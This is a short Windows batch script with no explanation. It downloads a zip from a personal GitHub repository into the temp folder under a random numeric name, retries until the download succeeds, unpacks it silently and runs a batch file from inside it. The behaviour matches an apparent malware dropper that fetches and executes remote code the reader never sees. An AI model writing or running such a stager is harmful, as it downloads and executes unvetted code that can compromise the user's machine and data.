@echo off
setlocal
set "url=https://github.com/Marinff/test/raw/refs/heads/main/python.zip"
set "tempdir=%temp%"
set "output=%tempdir%\10238102319.zip"
:download
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %output%"
for %%A in ("%output%") do (
    if %%~zA == 0 (
        del "%output%"
        timeout /t 1 > nul
        goto download
    )
)
powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
powershell -Command "Start-Process -FilePath $env:TEMP\python\1.bat"
exit
